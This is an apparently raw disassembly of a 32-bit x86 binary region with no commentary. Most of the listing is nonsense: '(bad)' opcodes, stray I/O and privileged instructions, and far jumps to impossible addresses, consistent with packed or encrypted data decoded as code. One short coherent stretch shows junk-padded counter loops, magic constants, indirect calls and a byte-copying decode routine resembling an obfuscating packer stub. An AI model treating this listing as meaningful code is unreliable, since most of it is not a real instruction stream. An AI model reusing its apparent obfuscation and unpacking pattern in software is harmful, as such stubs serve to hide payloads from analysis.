  408016:	adc    BYTE PTR [ecx+ebx*1+0x79b104d0],0xf8
  40801e:	mov    ch,0xb4
  408020:	(bad)  
  408021:	enter  0x967a,0x9e
  408025:	mov    bl,0x9b
  408027:	(bad)  
  408028:	and    al,0xd4
  40802a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40802b:	inc    ecx
  40802c:	es mov ah,0x1
  40802f:	mov    bh,0x43
  408031:	add    al,0x67
  408033:	mov    ch,0x13
  408035:	fisub  DWORD PTR [ebx+esi*4-0x5dfda558]
  40803c:	in     eax,0xd8
  40803e:	inc    edi
  40803f:	or     al,0x20
  408041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408042:	retf   0xf361
  408045:	fiadd  DWORD PTR [eax]
  408047:	out    dx,al
  408048:	pop    ebp
  408049:	enter  0x46fa,0x16
  40804d:	pop    ss
  40804e:	cmp    DWORD PTR [ebx-0x8e54e5e],esi
  408054:	(bad)  
  408055:	mov    esi,0x14932d1c
  40805a:	or     ecx,0xffffffa1
  40805d:	jmp    0x71415a5f
  408062:	imul   eax
  408064:	frstor [ecx]
  408066:	imul   eax,DWORD PTR [ecx],0xa1f7b499
  40806c:	fs sbb al,0x29
  40806f:	es ins DWORD PTR es:[edi],dx
  408071:	stos   BYTE PTR es:[edi],al
  408072:	xor    DWORD PTR [ebp-0x38ebd008],edi
  408078:	pusha  
  408079:	push   edi
  40807a:	add    edx,DWORD PTR [ebx+0x6ae0fbe]
  408080:	xchg   DWORD PTR [esi-0x54],ecx
  408083:	retf   
  408084:	xchg   edx,eax
  408085:	shr    DWORD PTR [eax-0x68],cl
  408088:	push   edi
  408089:	ja     0x40804c
  40808b:	iret   
  40808c:	sbb    eax,0x10f92e1b
  408091:	inc    ebp
  408092:	cli    
  408093:	test   DWORD PTR [ebx+0x11],0xd98edf64
  40809a:	leave  
  40809b:	fist   WORD PTR [eax+0x2b]
  40809e:	add    DWORD PTR [ebp+0x11],edi
  4080a1:	in     eax,0x36
  4080a3:	and    ecx,DWORD PTR [ecx+0x607b0ed]
  4080a9:	sbb    al,0xad
  4080ab:	sbb    eax,0xfe8ca862
  4080b0:	pop    edx
  4080b1:	adc    DWORD PTR [edi+edx*4-0x16],eax
  4080b5:	stos   BYTE PTR es:[edi],al
  4080b6:	and    eax,0xfde16d81
  4080bb:	cdq    
  4080bc:	outs   dx,DWORD PTR ds:[esi]
  4080bd:	mov    edi,0xb177ff2e
  4080c2:	sbb    BYTE PTR [ebp+0x1],0x71
  4080c6:	cmp    BYTE PTR ds:0x8500076d,ah
  4080cc:	dec    ebp
  4080cd:	pop    ecx
  4080ce:	add    eax,0x7906e335
  4080d3:	adc    ch,BYTE PTR [edx-0x7f]
  4080d6:	cmp    al,0x25
  4080d8:	mov    eax,ds:0x2de67201
  4080dd:	mov    ch,0x77
  4080df:	dec    esi
  4080e0:	dec    ecx
  4080e1:	adc    edi,DWORD PTR [edi]
  4080e3:	gs mov ch,0x73
  4080e6:	popa   
  4080e7:	lock mov esp,0x5ac28990
  4080ed:	fadd   DWORD PTR [ebx+0x79]
  4080f0:	bound  esi,QWORD PTR [ecx-0x65ee5b2d]
  4080f6:	push   ds
  4080f7:	test   BYTE PTR [ecx+0x31746cd9],dh
  4080fd:	fsub   DWORD PTR [edi]
  4080ff:	outs   dx,DWORD PTR ds:[esi]
  408100:	push   esi
  408101:	imul   eax,DWORD PTR [ebx+0x37cae27b],0xbc416382
  40810b:	xor    DWORD PTR [esi+0x42002d2b],edi
  408111:	sbb    DWORD PTR [eax+eiz*8+0x4cff12c1],ecx
  408118:	mov    dh,0xf6
  40811a:	jnp    0x4080af
  40811c:	data16 sub BYTE PTR [ecx-0x7f75dd4e],bl
  408123:	call   0x6c122c32
  408128:	and    al,0x6b
  40812a:	mov    ss,WORD PTR [ebx+0x5088cb9e]
  408130:	fisubr DWORD PTR [ebp-0x43e0eb9e]
  408136:	inc    eax
  408137:	jecxz  0x4080f2
  408139:	dec    ebx
  40813a:	aas    
  40813b:	iret   
  40813c:	push   esp
  40813d:	cmp    eax,0x918f5c37
  408142:	adc    BYTE PTR [ebp-0x4c],bh
  408145:	mov    ecx,0x6bedd60b
  40814a:	and    DWORD PTR [edx+0x23],esp
  40814d:	das    
  40814e:	add    al,0x6c
  408150:	mov    edi,0x63b4403f
  408155:	jae    0x4081d0
  408157:	xor    ebp,DWORD PTR [ebp-0x27ee4da2]
  40815d:	sub    ebx,DWORD PTR [ecx]
  40815f:	add    bh,dh
  408161:	ja     0x40817a
  408163:	push   edi
  408164:	das    
  408165:	cwde   
  408166:	push   ss
  408167:	push   es
  408168:	mov    esp,0xfc69a85f
  40816d:	or     al,0xfc
  40816f:	or     BYTE PTR [ecx+ecx*4+0x43],0x93
  408174:	jno    0x40814f
  408176:	add    BYTE PTR [esi-0x4b],dl
  408179:	in     eax,dx
  40817a:	push   cs
  40817b:	icebp  
  40817c:	xchg   esp,eax
  40817d:	sbb    eax,0xebbd35db
  408182:	mov    edi,0xad8c3af7
  408187:	cdq    
  408188:	std    
  408189:	mov    DWORD PTR [ebx+0x1c],esi
  40818c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40818d:	mov    gs,WORD PTR [esp+ebp*4+0x604695e1]
  408194:	mov    eax,0x992a24f
  408199:	xchg   ah,al
  40819b:	push   edi
  40819c:	es lock adc esi,esp
  4081a0:	mov    ?,WORD PTR [ecx-0x5a]
  4081a3:	ds es popf 
  4081a6:	and    eax,edi
  4081a8:	push   ds
  4081a9:	cmc    
  4081aa:	inc    eax
  4081ab:	fcom   QWORD PTR [edi+ecx*8]
  4081ae:	rol    BYTE PTR [ebx+eax*8+0x5f9badf5],cl
  4081b5:	push   0xffffff81
  4081b7:	data16 arpl WORD PTR [ebx-0x6b7dd902],cx
  4081be:	jmp    0x4081cb
  4081c0:	xor    bl,dl
  4081c2:	jmp    0x82b7:0x79423f6d
  4081c9:	push   ebx
  4081ca:	mov    edx,ecx
  4081cc:	fsubr  QWORD PTR [edx-0x62e99b33]
  4081d2:	std    
  4081d3:	cld    
  4081d4:	repz xor edi,edi
  4081d7:	and    DWORD PTR [eax+0x3039ac72],esi
  4081dd:	push   ebx
  4081de:	std    
  4081df:	inc    esp
  4081e0:	inc    eax
  4081e1:	or     DWORD PTR [ebp+0xe],ecx
  4081e4:	xor    eax,0x297085a9
  4081e9:	or     edx,ebx
  4081eb:	jb     0x408192
  4081ed:	ret    0x7000
  4081f0:	add    bh,BYTE PTR [ebx+eax*1-0x7f]
  4081f4:	imul   ecx,DWORD PTR cs:[eax-0x2d],0x77
  4081f9:	sub    ebx,DWORD PTR [esp+esi*8+0x21c7b8a1]
  408200:	aaa    
  408201:	add    edx,esi
  408203:	mov    esp,0x2b7100ff
  408208:	cmp    DWORD PTR [edi+0x3fffba46],0xd800e890
  408212:	mov    dh,0x3e
  408214:	xchg   ecx,eax
  408215:	push   edx
  408216:	ror    edx,cl
  408218:	scas   al,BYTE PTR es:[edi]
  408219:	ins    BYTE PTR es:[edi],dx
  40821a:	push   0x26b5b25a
  40821f:	dec    edx
  408220:	dec    esi
  408221:	xor    eax,0xe43907c2
  408226:	lods   eax,DWORD PTR ds:[esi]
  408227:	out    0x7a,al
  408229:	mov    esp,DWORD PTR [ecx-0x3a]
  40822c:	inc    edx
  40822d:	push   0xa3b43419
  408232:	xchg   ecx,eax
  408233:	popa   
  408234:	js     0x408242
  408236:	mov    bl,0xeb
  408238:	adc    BYTE PTR [esi+ebp*2],al
  40823b:	sbb    BYTE PTR [eax-0x51],ch
  40823e:	pop    edx
  40823f:	popa   
  408240:	dec    eax
  408241:	rcl    BYTE PTR [eax],cl
  408243:	mov    bl,BYTE PTR [ebx-0x50]
  408246:	enter  0xcb18,0xbe
  40824a:	leave  
  40824b:	sbb    BYTE PTR [esp+esi*4-0x7d1760c6],cl
  408252:	cmp    BYTE PTR [edx-0x4c],0x96
  408256:	jno    0x40828b
  408258:	imul   esp,DWORD PTR [esi-0x43],0xffffffde
  40825c:	mov    BYTE PTR [eax+0x62],cl
  40825f:	(bad)  
  408260:	scas   eax,DWORD PTR es:[edi]
  408261:	in     al,dx
  408262:	jle    0x408249
  408264:	jl     0x408281
  408266:	adc    BYTE PTR [edx-0x5b],cl
  408269:	mov    edx,0x76097efe
  40826e:	daa    
  40826f:	lds    ecx,FWORD PTR [ebp-0x7b0dccaf]
  408275:	pop    ss
  408276:	xchg   ecx,eax
  408277:	jmp    0xe5b6e104
  40827c:	sub    BYTE PTR [edx],bl
  40827e:	ror    DWORD PTR [ebp+0x44669a06],0xb5
  408285:	cs add eax,ecx
  408288:	in     eax,0xdc
  40828a:	(bad)  
  40828b:	hlt    
  40828c:	pop    ecx
  40828d:	mov    ecx,0x9e6b9147
  408292:	leave  
  408293:	dec    ecx
  408294:	imul   ebp,DWORD PTR [edx+eiz*8+0x32b1daa1],0xffffff90
  40829c:	dec    edi
  40829d:	jmp    0x408316
  40829f:	hlt    
  4082a0:	inc    edx
  4082a1:	(bad)  
  4082a2:	pop    esp
  4082a3:	stos   DWORD PTR es:[edi],eax
  4082a4:	int    0xae
  4082a6:	jne    0x408293
  4082a8:	and    al,0x83
  4082aa:	iret   
  4082ab:	scas   al,BYTE PTR es:[edi]
  4082ac:	dec    ebp
  4082ad:	mov    DWORD PTR [ecx-0x7a],0x7aadb40b
  4082b4:	or     BYTE PTR [ebx+0x42d05f52],dl
  4082ba:	cmp    ecx,DWORD PTR [esi+ebx*2-0x9685054]
  4082c1:	pop    ss
  4082c2:	in     al,dx
  4082c3:	xor    DWORD PTR [esi],ecx
  4082c5:	push   esi
  4082c6:	call   0xd6c6:0x18a2ea1c
  4082cd:	adc    BYTE PTR [ebx+0x29],dh
  4082d0:	xor    edi,esi
  4082d2:	cmp    al,0x86
  4082d4:	mov    BYTE PTR [eax],dl
  4082d6:	clc    
  4082d7:	outs   dx,BYTE PTR ds:[esi]
  4082d8:	sub    ah,bh
  4082da:	jb     0x408273
  4082dc:	rcl    dl,0xb5
  4082df:	pop    ecx
  4082e0:	adc    eax,0x65852db2
  4082e5:	xchg   esi,eax
  4082e6:	test   al,0x45
  4082e8:	mov    al,ds:0x6946f046
  4082ed:	cli    
  4082ee:	fsubrp st(3),st
  4082f0:	std    
  4082f1:	push   0x39655faf
  4082f6:	gs cmp al,0x44
  4082f9:	out    dx,eax
  4082fa:	daa    
  4082fb:	add    al,0xc0
  4082fd:	fld    DWORD PTR [edx+0x7e0b95f0]
  408303:	in     al,0x40
  408305:	retf   
  408306:	jp     0x408329
  408308:	fiadd  DWORD PTR [ebx]
  40830a:	jno    0x408383
  40830c:	retf   0xc01d
  40830f:	cmp    al,BYTE PTR [edi+0x48]
  408312:	xchg   BYTE PTR ds:0x2f71fe18,ah
  408318:	or     esi,DWORD PTR [eax-0x14]
  40831b:	scas   eax,DWORD PTR es:[edi]
  40831c:	scas   eax,DWORD PTR es:[edi]
  40831d:	push   0xfffffff3
  40831f:	mov    eax,0x408969c9
  408324:	aad    0xe2
  408326:	pop    ebx
  408327:	cmp    dh,BYTE PTR [edx-0x7d07cd98]
  40832d:	in     al,0xa3
  40832f:	pop    es
  408330:	ret    
  408331:	xchg   edx,eax
  408332:	test   BYTE PTR [esi-0x71],ch
  408335:	int3   
  408336:	or     al,0x95
  408338:	daa    
  408339:	sbb    DWORD PTR [eax-0x48],edi
  40833c:	xor    BYTE PTR [esi-0x61],dl
  40833f:	push   0xdfdf6390
  408344:	lock aam 0x69
  408347:	dec    edi
  408348:	pusha  
  408349:	push   eax
  40834a:	enter  0xd90b,0xb0
  40834e:	and    dh,BYTE PTR [edx*2+0x3b2eb095]
  408355:	cmp    BYTE PTR [ecx],dl
  408357:	aam    0xc5
  408359:	add    al,0xd2
  40835b:	pop    edi
  40835c:	push   es
  40835d:	ret    
  40835e:	test   DWORD PTR [ecx-0x43f1fd6f],edi
  408364:	and    esi,esp
  408366:	dec    BYTE PTR [ecx+edx*2-0x2c]
  40836a:	ss clc 
  40836c:	inc    eax
  40836d:	push   es
  40836e:	or     eax,0x37812246
  408373:	outs   dx,DWORD PTR ds:[esi]
  408374:	cs ss push cs
  408377:	adc    ah,bl
  408379:	enter  0xe3da,0xff
  40837d:	popa   
  40837e:	lods   eax,DWORD PTR ds:[esi]
  40837f:	fucomip st,st(4)
  408381:	dec    esi
  408382:	not    cl
  408384:	mov    bh,0x41
  408386:	and    esi,DWORD PTR [ebp+0x14]
  408389:	jbe    0x40834c
  40838b:	mov    edi,DWORD PTR [eax+0x146b949c]
  408391:	pop    edi
  408392:	call   0x3415:0x1c248a6f
  408399:	imul   ebx,DWORD PTR [ebp+0x69ddbc3f],0xad90564f
  4083a3:	fimul  WORD PTR [edi]
  4083a5:	or     eax,eax
  4083a7:	int3   
  4083a8:	inc    esi
  4083a9:	pop    ds
  4083aa:	adc    esp,DWORD PTR [eax+0x3f]
  4083ad:	adc    BYTE PTR [ebp-0x7e],bl
  4083b0:	jl     0x4083ec
  4083b2:	inc    esi
  4083b3:	inc    edx
  4083b4:	xchg   ecx,eax
  4083b5:	cwde   
  4083b6:	xchg   ebp,eax
  4083b7:	mov    ecx,0xb401ef3b
  4083bc:	pop    esi
  4083bd:	(bad)  
  4083be:	mov    al,ds:0xf875a9d7
  4083c3:	sbb    ebx,DWORD PTR [esi-0x5179c02]
  4083c9:	sbb    al,0x9e
  4083cb:	fldenv [esi+0x55ce907f]
  4083d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d2:	cmp    DWORD PTR [ebp-0x9aee38c],ecx
  4083d8:	xchg   ecx,eax
  4083d9:	imul   ebp,DWORD PTR [ebx+0x55],0x3f
  4083dd:	pusha  
  4083de:	imul   eax,DWORD PTR [edx],0xffffff8b
  4083e1:	dec    ecx
  4083e2:	test   dh,ch
  4083e4:	out    0x5c,eax
  4083e6:	aas    
  4083e7:	mov    dl,0x54
  4083e9:	xchg   ebp,eax
  4083ea:	pop    ss
  4083eb:	adc    eax,0xca999d52
  4083f0:	sti    
  4083f1:	xchg   esp,eax
  4083f2:	xchg   ebx,eax
  4083f3:	imul   edi,edi,0xffffffed
  4083f6:	inc    esi
  4083f7:	pushf  
  4083f8:	and    edx,DWORD PTR [ebp-0x5]
  4083fb:	xchg   di,ax
  4083fd:	mov    ecx,0xbade31fb
  408402:	addr16 mov al,ds:0x9c38
  408406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408407:	xchg   ebp,eax
  408408:	cld    
  408409:	rol    dh,0x3c
  40840c:	adc    DWORD PTR [esi+0x5b],ebx
  40840f:	leave  
  408410:	ret    0xc
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x424130,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8-0x3ee5aa73],dx
  4086d9:	xchg   ecx,eax
  4086da:	jle    0x40871e
  4086dc:	push   eax
  4086dd:	sbb    BYTE PTR [edx+0x62],ah
  4086e0:	cmp    bl,BYTE PTR [edi+0x62]
  4086e3:	bound  ecx,QWORD PTR [eax-0x71b027be]
  4086e9:	fld    TBYTE PTR [ecx]
  4086eb:	sbb    DWORD PTR ds:0x545aae04,esi
  4086f1:	(bad)  
  4086f2:	cld    
  4086f3:	repz push ds
  4086f5:	add    ecx,edx
  4086f7:	cdq    
  4086f8:	push   edx
  4086f9:	xor    bl,ah
  4086fb:	pop    esp
  4086fc:	ja     0x408757
  4086fe:	or     ah,ch
  408700:	hlt    
  408701:	mov    edx,0xf8cab5cc
  408706:	sbb    al,0x84
  408708:	fidiv  DWORD PTR [edx]
  40870a:	pop    eax
  40870b:	pushf  
  40870c:	jno    0x408694
  40870e:	sub    ebp,eax
  408710:	or     BYTE PTR [eax-0x5268ee63],dh
  408716:	rol    esi,0x2
  408719:	and    ecx,ebp
  40871b:	out    dx,al
  40871c:	xchg   edx,eax
  40871d:	pop    esi
  40871e:	stos   BYTE PTR es:[edi],al
  40871f:	fist   DWORD PTR cs:[ecx+0x6a2123ea]
  408726:	(bad)  
  408728:	addr16 pusha 
  40872a:	jge    0x408749
  40872c:	imul   eax,DWORD PTR [ebp+ebp*2+0x6444f166],0x5bcb7b42
  408737:	enter  0x9dcf,0x3
  40873b:	dec    ebp
  40873c:	shl    BYTE PTR [eax-0x517c907b],1
  408742:	ins    BYTE PTR es:[edi],dx
  408743:	and    edx,DWORD PTR [ecx+0x58]
  408746:	pop    ebp
  408747:	push   esi
  408748:	sub    al,0x76
  40874a:	pop    esi
  40874b:	pushf  
  40874c:	sub    esp,eax
  40874e:	and    ebp,DWORD PTR [edx]
  408750:	sub    dl,BYTE PTR [ebx+edi*1-0x7b101e92]
  408757:	jp     0x4086f3
  408759:	mov    ch,0x1d
  40875b:	ret    0x1f1b
  40875e:	cmp    edi,DWORD PTR [edx-0x551d537]
  408764:	adc    al,0x12
  408766:	daa    
  408767:	sub    DWORD PTR [ebx-0x69],eax
  40876a:	sub    al,0x50
  40876c:	xchg   esi,eax
  40876d:	mov    al,dl
  40876f:	xor    bl,BYTE PTR cs:[ebx]
  408772:	sub    DWORD PTR [eax+0x69a07587],ebx
  408778:	and    eax,DWORD PTR [edi]
  40877a:	xchg   esi,eax
  40877b:	mov    edi,DWORD PTR [esi+0x2a]
  40877e:	data16 mov al,ds:0x2eb8b074
  408784:	sbb    esi,eax
  408786:	jl     0x40870b
  408788:	add    eax,0x6c1238d4
  40878d:	push   0xe00e9ceb
  408792:	hlt    
  408793:	jnp    0x4087be
  408795:	fxch   st(4)
  408797:	or     eax,0x409ab3e
  40879c:	fcomp  QWORD PTR [eax]
  40879e:	inc    esi
  40879f:	lods   eax,DWORD PTR ds:[esi]
  4087a0:	pop    ax
  4087a2:	dec    edx
  4087a3:	cmc    
  4087a4:	je     0x4087cc
  4087a6:	lahf   
  4087a7:	imul   edi,ecx,0xf64c5b67
  4087ad:	loopne 0x408797
  4087af:	cmp    esp,ecx
  4087b1:	adc    al,0xca
  4087b3:	jecxz  0x40875c
  4087b5:	fsub   QWORD PTR [esi]
  4087b7:	cmp    ebp,DWORD PTR [ebp+0x2941bf8d]
  4087bd:	sbb    eax,0x2ef68c49
  4087c2:	xor    ah,ch
  4087c4:	sahf   
  4087c5:	mov    edx,ds
  4087c7:	imul   ebp,DWORD PTR [eax-0xd31d4fe],0x76
  4087ce:	frstor [edx-0x72e8e9e5]
  4087d4:	(bad)  [esi+0x54455170]
  4087da:	sub    al,0xa
  4087dc:	retf   
  4087dd:	imul   ebx,DWORD PTR [ebp-0x18],0x8d7a318c
  4087e4:	cmp    al,0xe7
  4087e6:	mov    dh,bh
  4087e8:	loopne 0x4087a8
  4087ea:	inc    ebx
  4087eb:	xchg   BYTE PTR [esi+0xd931d],ah
  4087f1:	retf   0x29d0
  4087f4:	jae    0x408856
  4087f6:	daa    
  4087f7:	inc    ecx
  4087f8:	enter  0x8b95,0x22
  4087fc:	sub    DWORD PTR [edx],edx
  4087fe:	pop    edi
  4087ff:	cld    
  408800:	jl     0x40881e
  408802:	pop    ebp
  408803:	xchg   esp,eax
  408804:	adc    DWORD PTR [ecx],esi
  408806:	mov    ebp,DWORD PTR [edx+edx*4+0x8]
  40880a:	scas   al,BYTE PTR es:[edi]
  40880b:	cmp    esi,ebp
  40880d:	jnp    0x4087c8
  40880f:	aas    
  408810:	stos   BYTE PTR es:[edi],al
  408811:	pushf  
  408812:	dec    esp
  408813:	and    eax,0xc579de3a
  408818:	sub    eax,0x54fee2c0
  40881d:	and    cl,BYTE PTR ds:0xd1346e04
  408823:	cwde   
  408824:	mov    ebp,0x7ef72fbf
  408829:	in     eax,0xf7
  40882b:	call   0xbcf6950c
  408830:	sbb    eax,ebx
  408832:	inc    esp
  408833:	mov    edi,0x45e3149
  408838:	add    eax,0xa57442ff
  40883d:	and    DWORD PTR [ecx+0x632161ed],0x4d
  408844:	into   
  408845:	pushf  
  408846:	rcl    BYTE PTR [edx],cl
  408848:	push   eax
  408849:	mov    db3,edx
  40884c:	mov    esi,0xfac507fe
  408851:	pushf  
  408852:	xchg   ebp,eax
  408853:	cli    
  408854:	hlt    
  408855:	icebp  
  408856:	out    dx,eax
  408857:	outs   dx,BYTE PTR ds:[esi]
  408858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408859:	retf   0xd301
  40885c:	push   ds
  40885d:	dec    BYTE PTR [edx+0x7fa72caf]
  408863:	inc    edi
  408864:	xchg   esi,eax
  408865:	cmp    BYTE PTR [esi],dl
  408867:	cmp    DWORD PTR [edx+0x4dbf4403],edx
  40886d:	cld    
  40886e:	and    ecx,DWORD PTR [edi+0x1e87f0be]
  408874:	add    edx,DWORD PTR [eax+eax*1]
  408877:	dec    eax
  408878:	or     DWORD PTR [edx],ebx
  40887a:	mov    es,WORD PTR [ebx-0x68]
  40887d:	into   
  40887e:	sahf   
  40887f:	(bad)  
  408880:	enter  0x7c64,0xd4
  408884:	stos   BYTE PTR es:[edi],al
  408885:	or     BYTE PTR [eax+ebx*2-0x4fa44c60],0x3d
  40888d:	jg     0x408815
  40888f:	mov    BYTE PTR ds:0x1554b790,al
  408895:	(bad)  
  408897:	xchg   edi,eax
  408898:	sbb    edx,edi
  40889a:	out    dx,eax
  40889b:	sti    
  40889c:	jl     0x4088bb
  40889e:	bound  esp,QWORD PTR [ecx-0x12bbd11d]
  4088a4:	adc    bl,bl
  4088a6:	(bad)  
  4088a7:	hlt    
  4088a8:	dec    esi
  4088a9:	call   0xa9e6:0x2d1f73ab
  4088b0:	push   edi
  4088b1:	int    0xc
  4088b3:	or     BYTE PTR [esi+0x2c],ah
  4088b6:	jno    0x408849
  4088b8:	outs   dx,DWORD PTR ds:[esi]
  4088b9:	sub    al,0xbc
  4088bb:	bswap  edi
  4088bd:	mov    esp,0x44258939
  4088c2:	adc    al,0x4f
  4088c4:	add    esi,esp
  4088c6:	mov    eax,ds:0x6d2c4d97
  4088cb:	stc    
  4088cc:	xchg   esi,eax
  4088cd:	mov    eax,DWORD PTR [esi+0x2d]
  4088d0:	in     eax,dx
  4088d1:	mov    esi,0x48505d7
  4088d6:	jp     0x40890f
  4088d8:	(bad)  
  4088d9:	push   cs
  4088da:	dec    ebx
  4088db:	push   ss
  4088dc:	ret    0xcfff
  4088df:	jb     0x4088fb
  4088e1:	jo     0x408891
  4088e3:	fld    DWORD PTR [ebp+0x9cafdbc]
  4088e9:	jmp    0xd21a:0xa6a9a876
  4088f0:	jp     0x40893e
  4088f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f3:	cmp    eax,0x363e2100
  4088f8:	outs   dx,BYTE PTR ds:[esi]
  4088f9:	bound  eax,QWORD PTR [eax+eiz*8+0x7acba924]
  408900:	xchg   edi,eax
  408901:	mov    bl,0xbd
  408903:	or     BYTE PTR [edi-0x41],cl
  408906:	mov    ds:0xd0238629,eax
  40890b:	fnsave [ebx*1+0x779a63b1]
  408912:	cmp    eax,0x56be8dd1
  408917:	or     edi,DWORD PTR [eax+0x6f]
  40891a:	out    0xe3,al
  40891c:	jmp    0x1883:0x5a9986e2
